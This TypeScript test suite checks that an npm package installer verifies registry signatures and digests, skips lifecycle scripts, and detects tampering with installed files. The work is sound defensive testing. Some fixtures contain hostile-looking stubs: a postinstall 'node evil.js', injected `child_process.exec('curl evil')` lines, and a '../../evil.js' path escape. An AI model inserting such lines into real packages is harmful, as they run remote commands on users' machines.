import { afterAll, describe, expect, test } from "bun:test";
import { chmodSync, existsSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { ArtifactError, describeEvidence, installNpm, resolveNpm, treeHash, verifyInstalled, verifyNpmSignature } from "../src/index.ts";
import { cleanupFakeNpm, fakeRegistry, otherKey, registryKey, servers, spki, tarball, tmp } from "./fake-npm.ts";

afterAll(cleanupFakeNpm);

// Suite category: Safety/security invariant (REQ-SEC-003 artifact identity: registry signature, digest match, no lifecycle scripts, tamper detection).
// A fake npm registry serves real tarballs and a real ECDSA registry key, and the install runs the real `bun install`.
const BUN = process.execPath;
const ref = (name = "demo-server", version = "1.0.0") => ({ registry: "npm" as const, name, version });

describe("resolveNpm: what the registry published, and whether it signed it", () => {
  test("reports the exact digest, a verified registry signature and the publisher facts", async () => {
    const reg = fakeRegistry([{ name: "demo-server", version: "1.0.0", deps: { left: "^1.0.0" }, scripts: { postinstall: "node evil.js", test: "x" } }]);
    const e = await resolveNpm(ref(), { registryUrl: reg.url });
    expect(e).toMatchObject({ integrity: reg.integrity("demo-server"), signature: "npm-registry-ecdsa", signatureKeyId: "SHA256:test", publisher: "alice", maintainers: ["alice", "bob"], installScripts: ["postinstall"], dependencyCount: 1, attestation: "absent" });
    expect(describeEvidence(e)).toContain("registry signature verified");
    expect(describeEvidence(e)).toContain("declares install scripts (postinstall) which August will not run");
  });

  test("a signature that does not verify is refused: wrong key, altered digest, unknown key id, expired key", async () => {
    const wrongKey = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { signWith: otherKey });
    await expect(resolveNpm(ref(), { registryUrl: wrongKey.url })).rejects.toThrow(/signature .* does not verify/);
    const altered = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { versionDoc: (doc) => ({ ...doc, dist: { ...(doc.dist as object), integrity: `sha512-${Buffer.alloc(64, 1).toString("base64")}` } }) });
    await expect(resolveNpm(ref(), { registryUrl: altered.url })).rejects.toThrow(/does not verify/);
    const unknownId = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { keys: { keys: [{ keyid: "SHA256:other", key: spki(registryKey), expires: null }] } });
    await expect(resolveNpm(ref(), { registryUrl: unknownId.url })).rejects.toThrow(/does not verify/);
    const expired = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { keys: { keys: [{ keyid: "SHA256:test", key: spki(registryKey), expires: "2001-01-01T00:00:00.000Z" }] } });
    await expect(resolveNpm(ref(), { registryUrl: expired.url, now: () => Date.parse("2026-01-01") })).rejects.toThrow(/does not verify/);
    expect(verifyNpmSignature("m", "not-base64!", "AAAA")).toBe(false);
  });

  test("pinned keys replace the registry's own key list", async () => {
    const reg = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { keys: { keys: [] } });
    await expect(resolveNpm(ref(), { registryUrl: reg.url })).rejects.toThrow(/does not verify/);
    expect((await resolveNpm(ref(), { registryUrl: reg.url, pinnedKeys: { "SHA256:test": spki(registryKey) } })).signature).toBe("npm-registry-ecdsa");
  });

  test("an unsigned package is reported as unsigned, not as verified", async () => {
    const reg = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { versionDoc: (doc) => ({ ...doc, dist: { ...(doc.dist as object), signatures: undefined } }) });
    expect((await resolveNpm(ref(), { registryUrl: reg.url })).signature).toBe("none");
  });

  test("ranges, tags, odd names, the wrong package, missing digests and registry errors are all refused", async () => {
    const reg = fakeRegistry([{ name: "demo-server", version: "1.0.0" }]);
    for (const version of ["^1.0.0", "latest", "1.x", "1.0", "", "1.0.0 || 2.0.0"]) await expect(resolveNpm(ref("demo-server", version), { registryUrl: reg.url })).rejects.toThrow(/exact version/);
    for (const name of ["Bad Name", "../x", "a/b/c", ""]) await expect(resolveNpm(ref(name), { registryUrl: reg.url })).rejects.toThrow(/valid npm package name/);
    const wrong = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { versionDoc: (doc) => ({ ...doc, name: "someone-else" }) });
    await expect(resolveNpm(ref(), { registryUrl: wrong.url })).rejects.toThrow(/different package/);
    const sha1 = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { versionDoc: (doc) => ({ ...doc, dist: { shasum: "abc", tarball: "x" } }) });
    await expect(resolveNpm(ref(), { registryUrl: sha1.url })).rejects.toThrow(/sha512 integrity/);
    await expect(resolveNpm(ref(), { registryUrl: fakeRegistry([], { status: 503 }).url })).rejects.toThrow(/HTTP 503/);
    await expect(resolveNpm(ref("missing-pkg"), { registryUrl: reg.url })).rejects.toThrow(/HTTP 404/);
  });
});

describe("installNpm and tree verification (real bun install)", () => {
  const installInto = async (reg: ReturnType<typeof fakeRegistry>, name = "demo-server", extra: Partial<Parameters<typeof installNpm>[2]> = {}) => {
    const evidence = await resolveNpm(ref(name), { registryUrl: reg.url });
    const dir = join(tmp(), "cap");
    return { evidence, dir, run: () => installNpm(evidence, dir, { bun: BUN, registryUrl: reg.url, cacheDir: join(tmp(), "cache"), nodeAvailable: true, ...extra }) };
  };

  test("installs exactly the approved version without running lifecycle scripts, and pins what it installed", async () => {
    const marker = join(tmp(), "ran-postinstall");
    const reg = fakeRegistry([{ name: "demo-server", version: "1.0.0", scripts: { postinstall: `node -e "require('fs').writeFileSync('${marker}','x')"` } }]);
    const { evidence, dir, run } = await installInto(reg); const pin = await run();
    expect(pin).toMatchObject({ registry: "npm", name: "demo-server", version: "1.0.0", integrity: evidence.integrity, signature: "npm-registry-ecdsa", entry: { runtime: "node", file: "node_modules/demo-server/bin.js" } });
    expect(pin.treeSha256).toMatch(/^[0-9a-f]{64}$/); expect(pin.treeSha256).toBe(treeHash(dir));
    expect(existsSync(join(dir, "node_modules/demo-server/bin.js"))).toBe(true);
    expect(existsSync(marker)).toBe(false);
    expect(verifyInstalled(pin, dir)).toBe(true);
  });

  test("any change to the installed tree is detected: edit, new file, deletion, permission change, replaced link", async () => {
    const reg = fakeRegistry([{ name: "demo-server", version: "1.0.0", files: { "lib/a.js": "module.exports = 1;" } }]);
    const { dir, run } = await installInto(reg); const pin = await run();
    const file = join(dir, "node_modules/demo-server/lib/a.js"); const original = readFileSync(file, "utf8");
    writeFileSync(file, `${original}\nrequire('child_process').exec('curl evil');`); expect(verifyInstalled(pin, dir)).toBe(false);
    writeFileSync(file, original); expect(verifyInstalled(pin, dir)).toBe(true);
    writeFileSync(join(dir, "node_modules/demo-server/extra.js"), "x"); expect(verifyInstalled(pin, dir)).toBe(false); rmSync(join(dir, "node_modules/demo-server/extra.js"));
    chmodSync(file, 0o755); expect(verifyInstalled(pin, dir)).toBe(false); chmodSync(file, 0o644);
    expect(verifyInstalled(pin, dir)).toBe(true);
    rmSync(file); expect(verifyInstalled(pin, dir)).toBe(false);
    expect(verifyInstalled(pin, join(dir, "does-not-exist"))).toBe(false);
  });

  test("a tarball swapped after the signature was made never installs, and leaves nothing behind", async () => {
    const evil = tarball({ name: "demo-server", version: "1.0.0", files: { "bin.js": "#!/usr/bin/env node\nrequire('child_process').exec('curl evil');" } });
    const reg = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { swapTarball: evil.bytes });
    const { dir, run } = await installInto(reg);
    await expect(run()).rejects.toThrow(ArtifactError);
    expect(existsSync(dir)).toBe(false);
  });

  test("a packument that claims a different digest than the signed metadata is caught by the lockfile check", async () => {
    const evil = tarball({ name: "demo-server", version: "1.0.0", files: { "bin.js": "#!/usr/bin/env node\nevil" } });
    const reg = fakeRegistry([{ name: "demo-server", version: "1.0.0" }], { swapTarball: evil.bytes, packumentIntegrity: evil.integrity });
    const { evidence, dir, run } = await installInto(reg);
    expect(evidence.integrity).not.toBe(evil.integrity);
    await expect(run()).rejects.toThrow(/does not match the digest the registry signed/);
    expect(existsSync(dir)).toBe(false);
  });

  test("dependencies from git, URLs or files are refused: only registry packages with integrity digests are allowed", async () => {
    const dep = tarball({ name: "sneaky", version: "1.0.0" });
    const depServer = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: () => new Response(dep.bytes) }); servers.push(depServer);
    const reg = fakeRegistry([{ name: "demo-server", version: "1.0.0", deps: { sneaky: `http://127.0.0.1:${depServer.port}/sneaky.tgz` } }]);
    const { dir, run } = await installInto(reg);
    await expect(run()).rejects.toThrow(/does not come from the registry|installing the package failed/);
    expect(existsSync(dir)).toBe(false);
  });

  test("a package with no executable, or one that points outside itself, cannot be started", async () => {
    const none = fakeRegistry([{ name: "demo-server", version: "1.0.0", bin: {} }]);
    await expect((await installInto(none)).run()).rejects.toThrow(/no executable/);
    const escape = fakeRegistry([{ name: "demo-server", version: "1.0.0", bin: "../../evil.js" }]);
    await expect((await installInto(escape)).run()).rejects.toThrow(/leaves the package|no executable|missing/);
  });

  test("the runtime follows the shebang, and falls back to bun when node is not available", async () => {
    const bunScript = fakeRegistry([{ name: "demo-server", version: "1.0.0", files: { "bin.js": "#!/usr/bin/env bun\nconsole.log(1)" } }]);
    expect((await (await installInto(bunScript)).run()).entry.runtime).toBe("bun");
    const node = fakeRegistry([{ name: "demo-server", version: "1.0.0" }]);
    expect((await (await installInto(node, "demo-server", { nodeAvailable: false })).run()).entry.runtime).toBe("bun");
  });

  test("installs a scoped package", async () => {
    const reg = fakeRegistry([{ name: "@acme/tool", version: "2.1.0" }]);
    const evidence = await resolveNpm({ registry: "npm", name: "@acme/tool", version: "2.1.0" }, { registryUrl: reg.url });
    const dir = join(tmp(), "cap");
    const pin = await installNpm(evidence, dir, { bun: BUN, registryUrl: reg.url, cacheDir: join(tmp(), "c"), nodeAvailable: true });
    expect(pin.entry.file).toBe("node_modules/@acme/tool/bin.js");
  });
});
